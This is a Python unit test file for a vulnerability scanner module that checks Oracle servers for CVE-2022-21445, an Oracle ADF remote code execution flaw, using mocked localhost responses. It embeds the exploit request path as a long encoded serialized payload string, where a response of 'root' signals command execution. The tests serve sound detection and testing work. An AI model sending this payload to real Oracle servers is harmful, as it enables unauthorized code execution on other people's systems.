"""Unit tests for Agent Asteroid: CVE-2022-21445"""

import requests_mock as req_mock
import requests

from agent import definitions
from agent.exploits import cve_2022_21445

CONTEXT_APP = ["/bicomposer", "/em"]
EXPLOIT_PATH = (
    "/afr/foo/remote/H4sIAAAAAAAAAA%3D%3DtVdbcBtXGf5WlrSb9ToX5eIotzalDXJi6%2BJbsB1KJdkiAeVCZNwkBsxqdWxv"
    "-stqVd49sB2jacm8LpdxpaBugtOESmOFFZDqTTuCBYWCAGV6Y4QF4YIYO0z7BDDwwlP_oEkux3DgP"
    "-SKOze_7_P__l_N_5_6NrbyDguRgwnGKU6_ac4zlW1LQ5c23dipa5KWaLzgUWPc2KDmdpx_a4Wza4"
    "-4_7m8uuZ6T_9fckH3zSU4ozuJN05j2PrdPa8vqjHLFIXO5k_zww%2BloVWnCmwWdM2uenYHANZshhr"
    "-WIw1LMaExVjNYixt6Z43fmvR2HKp7Da0R4X2aF37M789c2Wz12P5gOUS6EMRJe4c0W36H_j1q0_9-C3"
    "%2B8XI1nA8WTrwpwmqay8BdnzAJHYr1%2BHyswm5v8Ys1rUnHtH93_DiqTf6k72Vn51X9feZV8HcSP-ZZxQcRAnVZzC"
    "%2B2ScVuFHToWESQXvV6FhSsXDOCOGswrOyZgWxA%2Bo%2BCA%2BJGNGwYdl6AqOqNiEvIrd"
    "-MBQUVDDMismcgnnxNFWcxwUZloKieLUVOApKKrZgQYULTwVHWbwtimFJDMuCe1HGR1S8HR%2BV8TEZ"
    "-j0gIHhFb9qCEjkjPlAR_2ikwCZuyps1OlIt55k7qeYsooaxj6NaU7ppiXif62TIzJGxtAskp1zGY"
    "-541JkPWCXqItlbA7u8TyljNnGrElx70Qe5iGZI1JcoFZk1kFCeEmLS6btQgNsYxgkUyHkz8vfFgF"
    "-RmK5bEFCdMWEx9xFi_GVfOZqhNNsocw8fqxYsmrLPAmx9SzzSnRQWGOdUSy0epLjrmnPEcu_qLsJ-CdubeBPLBitVAU9sPm"
    "%2BSyXPrQJ2lF_MFPZatPhrou38i0T%2BRTg6OZOLD4_HBeCI5Mj4YH071j6fT"
    "-hweHB5JkoyvHdePCcb1UTVA1x5dkPEqgJGwRsAgxMh4jDEhQc07ZNVjGFIkcvEtTURGihM2350PD-ITwu4"
    "%2BMaPoFPUuJb8z5BaClzNjnvMr2g4VP4tIbP4LMSthiObdNy2qijul2wmKvhCTxJnmt4Cp_T"
    "-8Hk8TVJzjLfmkoC64kH1qGr4Ap6R8UUNX8KXJfTeDSoorc0WammX0HdXENHwFXxVw9fwdToBjhe1"
    "-9SLl4RsanhXky_gmQWjJtDU8h%2BdlvKDhCr7VspE1OEnwxQwNcXyb3rx5Gvpo%2Bh28KOO7Gl5CL6VR-w8u4quF7"
    "%2BL6GH6BXww_FcA29dCLbQFDDjwTrzP8LflK189xBdTJPLUc3eLUD1YpIeM3iIKF7jZJA"
    "-YFhVciTsiLRpV6KqNW1vDXx0Uoyy61Jkjfm2SE_2dik6UBsJEemapHBMwl6Se6tqpogFAomUhBaV"
    "-VSIJbCaBcWZYussK9Vj6IqvLSc9bVMMuj_GkIWI2a2U4ck5E2UGaJRyItNmDdoVzA4kfZ3zeIQ8e"
    "-auPB9Crn2_lU00Dqdq7Fox5TS76EkTa%2BtUvZWu4epaQIWBy4w4bdKsmy6U0US_xitb2daz1nFz3O"
    "-ihI6SS8hqMRcIdbJnayzxNy0Lo5%2BKyhuaVWoXHHdtCnHu5s9Sc_rbk7UE9tgY8JcE0hPl%2BkUFUmn"
    "-SvZuTba3GKiTyUKkBcltIlxpsztWatbJMi%2BVOUkznQIbakbqWqWreUm9wyXuehFtm2Ex3U2VZ2dF"
    "-esShOWY3udLdCNN0Yk0MMta55JqcNeR2RtqKCXAHZq2yqIMBw3JEajqr84bFTSXaIV5tfpNUXhj2-o4duYeIj0fcQemnsA3w"
    "%2BBKAQ9Y2DHTcg_RS%2B6%2Bi4CX8FgeyhCoIhuQLleC_NN_TSXD3RJ4idJKtV"
    "-0NUn1lSw8SY2jfqrnM2rOFtGA2F_KFTB1tFgOPgLXAoHK9h2GYuh7dexo4Lu0M4Kws9i_3XsCt7A-7rMdoVDurD"
    "%2B0J3c2EA7mKtg7Kl_FvhXuPsG9p4kbDlRwbwX7q88wOXxfBW%2BrE%2B%2BvPx8QzwNXoYio-Ij%2Bh4BX8FX%2Bji18HohT"
    "%2BFLbTGCSqghA2YA9U2rJO4mtIogvT2IgC3UAX6Mr4OElcwTa8gh34Obrx-O"
    "%2BzEHxDGn7GLdO4jrXvwGvbiddyDGGmdJV3PkZ04EpBp1cH6Wwi_Rz8GyJc9%2BCVdlYfgI3s3MIzD"
    "-JJ3Ei3gHRui2PE2tfxRjlKgCHsMRvJP8fI3oD%2BJdtJZSh4dIGkjRbwCBN8k5WUZaxriMCRkZGe%2BW"
    "-cVTGMeA_2CXjPW8SFiSSoCUy3usnJVla6sNx%2BmsRW%2Bdfi0YXfCTzM37zn5ERHzqy6CzOeCkqFCeo"
    "-x_N2d8IsVBI5RajU59gCLqGrRplirkcduUpZLnFsbG21HJH1NmmOewf7B1Lx_nR8KB5PHE71D46n"
    "-EvHxTObw0EgyOTScyvwPvlNuShcOAAA%3D-/"
)


def testOracleADFExploit_whenVulnerable_reportFinding(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2022-21445 unit test: case when target is vulnerable."""
    requests_mock.get(
        "http://localhost:7001/",
        headers={"X-ORACLE-DMS-ECID": "some-value"},
        status_code=200,
    )

    for context in CONTEXT_APP:
        requests_mock.get(
            f"http://localhost:7001{context}{EXPLOIT_PATH}",
            text="root",
            status_code=200,
        )

    exploit_instance = cve_2022_21445.OracleADFExploit()
    target = definitions.Target("http", "localhost", 7001)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 1
    vulnerability = vulnerabilities[0]
    assert (
        vulnerability.entry.title
        == "Oracle Application Development Framework (ADF) Remote Code Execution Vulnerability"
    )
    assert vulnerability.technical_detail == (
        "http://localhost:7001/ is vulnerable to CVE-2022-21445, Oracle Application Development Framework (ADF) Remote "
        "Code Execution Vulnerability"
    )
    assert vulnerability.vulnerability_location is not None
    assert vulnerability.dna is not None


def testOracleADFExploit_whenNotVulnerable_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2022-21445 unit test: case when target is not vulnerable."""
    requests_mock.get(
        "http://localhost:7001/",
        headers={"X-ORACLE-DMS-ECID": "some-value"},
        status_code=200,
    )

    for context in CONTEXT_APP:
        requests_mock.get(
            f"http://localhost:7001{context}{EXPLOIT_PATH}",
            status_code=404,
        )

    exploit_instance = cve_2022_21445.OracleADFExploit()
    target = definitions.Target("http", "localhost", 7001)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0


def testOracleADFExploit_whenRequestException_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2022-21445 unit test: case when a request exception occurs."""
    requests_mock.get(
        "http://localhost:7001/",
        exc=requests.RequestException("Mocked network error"),
    )

    exploit_instance = cve_2022_21445.OracleADFExploit()
    target = definitions.Target("http", "localhost", 7001)

    accept = exploit_instance.accept(target)

    assert accept is False


def testOracleADFExploit_whenNoOracleHeader_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2022-21445 unit test: case when no Oracle header is found."""
    requests_mock.get(
        "http://localhost:7001/",
        headers={"Server": "Apache/2.4.41 (Ubuntu)"},
        status_code=200,
    )

    exploit_instance = cve_2022_21445.OracleADFExploit()
    target = definitions.Target("http", "localhost", 7001)

    accept = exploit_instance.accept(target)

    assert accept is False


def testOracleADFExploit_whenExploitFails_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2022-21445 unit test: case when the exploit attempt fails."""
    requests_mock.get(
        "http://localhost:7001/",
        headers={"X-ORACLE-DMS-ECID": "some-value"},
        status_code=200,
    )

    for context in CONTEXT_APP:
        requests_mock.get(
            f"http://localhost:7001{context}{EXPLOIT_PATH}",
            text="Error 404--Not Found",
            status_code=404,
        )

    exploit_instance = cve_2022_21445.OracleADFExploit()
    target = definitions.Target("http", "localhost", 7001)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0
